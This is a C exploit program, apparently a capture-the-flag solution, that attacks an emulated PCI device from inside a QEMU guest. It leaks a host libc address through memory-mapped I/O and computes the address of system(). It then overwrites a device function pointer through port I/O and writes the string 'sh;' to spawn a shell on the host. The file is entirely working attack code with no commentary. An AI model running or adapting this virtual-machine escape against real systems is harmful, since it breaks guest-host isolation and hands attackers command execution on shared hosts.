#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define HEX(x) printf("[*]0x%016llx\n", (unsigned long long)x)
#define LOG(addr) printf("[*]%s\n", addr)

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN ((1ull << 55) - 1)
#define LOWMASK 0xffffffff
#define HIGHMASK 0xffffffff00000000

// typedef unsigned long long uint64_t;

uint32_t pmio_base = 0x000000000000c000;
void *mmio_mem;
char *userbuf;
uint64_t phy_userbuf;
int fd;

void Err(char *err) {
    printf("Error: %s\n", err);
    exit(-1);
}

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        Err("open pagemap");
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

size_t va2pa(void *addr) {
    uint64_t data;

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if (lseek(fd, offset, SEEK_SET) < 0) {
        puts("lseek");
        close(fd);
        return 0;
    }

    if (read(fd, &data, 8) != 8) {
        puts("read");
        close(fd);
        return 0;
    }

    if (!(data & (((uint64_t)1 << 63)))) {
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);

    return phyaddr;
}

uint64_t mmio_read(uint64_t addr) {
    return *(uint64_t *)(mmio_mem + addr);
}

void mmio_write(uint64_t addr, uint64_t val) {
    *(uint64_t *)(mmio_mem + addr) = val;
}

void pmio_write(uint32_t addr, uint32_t val) {
    outl(val, addr);
}

void pmio_writeb(uint32_t addr, uint8_t val) {
    outb(val, addr);
}

uint64_t pmio_read(uint32_t addr) {
    return (uint32_t)inl(addr);
}

uint64_t pmio_readb(uint32_t addr) {
    return (uint8_t)inb(addr);
}

void init_mmio() {
    int mmio_fd =
        open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        Err("Open pci");
    }
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        Err("mmap mmio_mem");
    }
    LOG("mmio_init");
}

void init_pmio() {
    if (iopl(3) != 0)
        Err("I/O permission is not enough");
    LOG("pmio_init");
}

void init_pa() {
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    LOG("pa_init");
}

int main() {

    init_pa();
    init_mmio();
    init_pmio();

    mmio_write(0x80, 0xf8);
    uint64_t srand_addr = mmio_read(0xC);
    HEX(srand_addr);

    uint64_t system_addr = srand_addr + 0xacd0;
    HEX(system_addr);

    HEX(mmio_read(0x1C));
    pmio_write(pmio_base, 666);
    HEX(pmio_read(pmio_base));
    pmio_write(pmio_base + 0x1C, system_addr & 0xffffffff);
    pmio_write(pmio_base + 0x20, system_addr >> 32);

    HEX(mmio_read(0x1C));

    mmio_write(0x40, 0x3b6873);

    return 0;
}
